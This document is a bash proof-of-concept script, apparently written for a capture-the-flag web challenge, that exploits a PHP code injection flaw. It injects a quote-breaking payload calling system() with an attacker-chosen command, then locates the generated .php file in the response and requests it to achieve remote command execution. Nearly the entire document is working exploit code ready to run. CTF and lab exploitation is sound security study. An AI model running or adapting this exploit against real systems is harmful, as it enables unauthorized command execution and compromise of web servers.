#!/usr/bin/env bash
# WriteSHell - quote-breakout inside returned array value, then execute generated PHP.
# Usage: ./poc_writeshell_rce.sh 'id'
set -euo pipefail
TARGET="${TARGET:-http://3e5571b3500a0ca8c0312716.http-ctf2.dasctf.com/}"
CMD="${1:-id}"
# Payload closes the single-quoted array value, uses a command function whose return
# value lands inside the returned array expression, then reopens a harmless string.
PAYLOAD="' . system('${CMD//\'/\\\'}') . '"
RESP="$(curl -s --max-time 20 --get --data-urlencode "cmd=${PAYLOAD}" "$TARGET")"
FN="$(printf '%s' "$RESP" | rg -o '[0-9a-f]{32}\.php' | tail -1)"
if [[ -z "$FN" ]]; then echo 'failed: no generated filename' >&2; exit 1; fi
curl -s --max-time 20 "${TARGET%/}/${FN}"
